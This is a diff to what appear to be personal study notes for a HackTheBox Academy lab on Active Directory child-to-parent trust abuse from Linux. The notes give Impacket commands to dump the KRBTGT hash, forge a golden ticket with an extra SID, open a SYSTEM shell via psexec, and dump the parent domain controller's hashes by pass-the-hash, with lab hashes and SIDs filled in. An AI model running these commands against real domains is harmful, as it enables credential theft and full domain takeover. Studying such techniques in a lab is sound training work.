@@ -108,6 +108,8 @@ klist
 ### Linux
 1) **Obtaining the KRBTGT**
 ```shell
+# this dsync
+# child domain DC ip
 secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 ```
 2) **Get child Domain SID**
@@ -127,6 +129,7 @@ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B1
 4) **Creating a Golden Ticket**
 ```shell
 # from Impacket toolkit
+# tha hash is krbtgt hash
 ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
 
 # The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials.
@@ -135,6 +138,11 @@ export KRB5CCNAME=hacker.ccache
 5) **Getting a SYSTEM shell**
 ```shell
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+6) **dump parent DC hashed**
+```shell
+# hashes is the admin hashe which we got from ticketer.py or raiseChild.py
+secretsdump.py inlanefreight.local/administrator@172.16.5.5 -just-dc -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf 
 ```
 
 #### we can use on tool to automate the proccess
